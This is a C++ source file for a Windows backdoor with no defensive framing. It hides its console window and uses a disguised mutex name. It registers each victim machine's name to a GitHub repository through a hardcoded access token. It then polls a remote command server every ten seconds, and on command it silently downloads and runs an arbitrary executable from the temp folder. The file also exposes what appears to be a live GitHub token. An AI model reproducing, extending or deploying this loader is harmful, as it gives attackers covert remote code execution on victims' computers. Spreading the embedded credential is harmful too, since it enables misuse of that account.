#include <windows.h>
#include <wininet.h>
#include <stdio.h>
#include <string>

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "user32.lib")

const char* MUTEX_NAME = "Local\\WindowsSysRuntimeMutex_V5";
const char* SERVER_HOST = "tg-bot-bekv.onrender.com";

const char* GH_TOKEN = "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";
const char* GH_REPO = "mam4939/agent-db";

std::string GetPCName() {
    char computerName[MAX_PATH];
    DWORD size = MAX_PATH;
    GetComputerNameA(computerName, &size);
    return std::string(computerName);
}

std::string base64_encode(const std::string& in) {
    std::string out;
    int val = 0, valb = -6;
    for (unsigned char c : in) {
        val = (val << 8) + c;
        valb += 8;
        while (valb >= 0) {
            out.push_back("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"[(val >> valb) & 0x3F]);
            valb -= 6;
        }
    }
    if (valb > -6) out.push_back("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"[((val << 8) >> (valb + 8)) & 0x3F]);
    while (out.size() % 4) out.push_back('=');
    return out;
}

void RegisterOnGitHub() {
    HINTERNET hInternet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) return;

    HINTERNET hConnect = InternetConnectA(hInternet, "api.github.com", INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) {
        InternetCloseHandle(hInternet);
        return;
    }

    std::string pcName = GetPCName();
    std::string path = "/repos/" + std::string(GH_REPO) + "/contents/computers/" + pcName + "/status.json";
    
    HINTERNET hRequest = HttpOpenRequestA(hConnect, "PUT", path.c_str(), NULL, NULL, NULL, INTERNET_FLAG_SECURE | INTERNET_FLAG_RELOAD, 0);
    if (!hRequest) {
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return;
    }

    std::string rawJson = "{\"pc\": \"" + pcName + "\", \"status\": \"Active\"}";
    std::string encodedContent = base64_encode(rawJson);

    std::string headers = "Authorization: Bearer " + std::string(GH_TOKEN) + "\r\nUser-Agent: Agent\r\nContent-Type: application/json";
    std::string body = "{\"message\": \"Register PC\", \"content\": \"" + encodedContent + "\"}";

    HttpSendRequestA(hRequest, headers.c_str(), headers.length(), (LPVOID)body.c_str(), body.length());

    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
}

void DownloadAndExecute(const std::string& fileUrl) {
    char tempPath[MAX_PATH];
    GetTempPathA(MAX_PATH, tempPath);
    std::string targetFilePath = std::string(tempPath) + "payload_exec.exe";

    HINTERNET hInternet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) return;

    HINTERNET hUrl = InternetOpenUrlA(hInternet, fileUrl.c_str(), NULL, 0, INTERNET_FLAG_SECURE | INTERNET_FLAG_RELOAD, 0);
    if (!hUrl) {
        InternetCloseHandle(hInternet);
        return;
    }

    FILE* f = fopen(targetFilePath.c_str(), "wb");
    if (f) {
        char buffer[4096];
        DWORD bytesRead = 0;
        while (InternetReadFile(hUrl, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
            fwrite(buffer, 1, bytesRead, f);
        }
        fclose(f);
    }
    InternetCloseHandle(hUrl);
    InternetCloseHandle(hInternet);

    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.wShowWindow = SW_HIDE;

    CreateProcessA(NULL, (char*)targetFilePath.c_str(), NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}

void PollCommands() {
    HINTERNET hInternet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) return;

    HINTERNET hConnect = InternetConnectA(hInternet, SERVER_HOST, INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) {
        InternetCloseHandle(hInternet);
        return;
    }

    std::string endpoint = "/api/get_command?pc=" + GetPCName();
    HINTERNET hRequest = HttpOpenRequestA(hConnect, "GET", endpoint.c_str(), NULL, NULL, NULL, INTERNET_FLAG_SECURE | INTERNET_FLAG_RELOAD, 0);
    if (!hRequest) {
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return;
    }

    if (HttpSendRequestA(hRequest, NULL, 0, NULL, 0)) {
        char buffer[1024];
        DWORD bytesRead = 0;
        std::string response = "";
        while (InternetReadFile(hRequest, buffer, sizeof(buffer) - 1, &bytesRead) && bytesRead > 0) {
            buffer[bytesRead] = '\0';
            response += buffer;
        }

        if (response.find("DOWNLOAD_AND_EXEC:") != std::string::npos) {
            size_t pos = response.find("DOWNLOAD_AND_EXEC:");
            std::string url = response.substr(pos + 18);
            size_t q = url.find("\"");
            if (q != std::string::npos) url = url.substr(0, q);
            DownloadAndExecute(url);
        }
    }

    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
}

int main(int argc, char* argv[]) {
    HANDLE hMutex = CreateMutexA(NULL, TRUE, MUTEX_NAME);
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        if (hMutex) CloseHandle(hMutex);
        return 0;
    }

    HWND hwnd = GetConsoleWindow();
    if (hwnd) ShowWindow(hwnd, SW_HIDE);

    RegisterOnGitHub();

    int counter = 0;
    while (true) {
        if (counter % 6 == 0) {
            RegisterOnGitHub();
        }
        PollCommands();
        Sleep(10000);
        counter++;
    }

    if (hMutex) {
        ReleaseMutex(hMutex);
        CloseHandle(hMutex);
    }
    return 0;
}
